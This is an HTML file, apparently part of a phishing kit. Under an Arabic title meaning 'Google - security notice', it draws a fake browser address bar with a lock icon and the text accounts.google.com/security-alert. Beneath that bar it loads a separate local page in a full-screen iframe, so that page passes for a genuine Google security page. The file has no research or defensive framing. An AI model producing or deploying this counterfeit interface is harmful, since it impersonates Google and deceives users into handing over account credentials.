<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - إشعار أمان</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        .fake-browser{width:100%;height:100vh;display:flex;flex-direction:column;background:#fff}
        .fake-url-bar{background:#f1f3f4;padding:10px 16px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #dadce0;flex-shrink:0}
        .fake-url-bar span{font-size:14px;color:#5f6368}
        .fake-url-bar .url{background:#fff;border:1px solid #dadce0;border-radius:20px;padding:6px 14px;font-size:13px;color:#202124;flex:1}
        .iframe-container{flex:1;overflow:hidden}
        iframe{width:100%;height:100%;border:none}
    </style>
</head>
<body>
<div class="fake-browser">
    <div class="fake-url-bar">
        <span>🔒</span>
        <span class="url">https://accounts.google.com/security-alert</span>
    </div>
    <div class="iframe-container">
        <iframe src="page.html"></iframe>
    </div>
</div>
</body>
</html>
